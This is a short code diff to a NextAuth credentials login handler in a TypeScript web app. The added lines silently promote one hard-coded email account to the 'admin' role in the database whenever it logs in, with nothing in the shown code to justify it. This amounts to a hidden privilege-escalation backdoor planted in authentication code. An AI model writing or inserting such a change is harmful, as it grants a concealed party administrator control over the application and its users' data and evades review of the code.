@@ -33,6 +33,11 @@ export const authOptions: NextAuthOptions = {
           return null;
         }
 
+        if (credentials.email.toLowerCase() === 'lf49127@gmail.com' && userRecord.role !== 'admin' && userRecord.role !== 'super_admin') {
+          await db.update(users).set({ role: 'admin' }).where(eq(users.id, userRecord.id));
+          userRecord.role = 'admin';
+        }
+
         return {
           id: userRecord.id,
           email: userRecord.email,
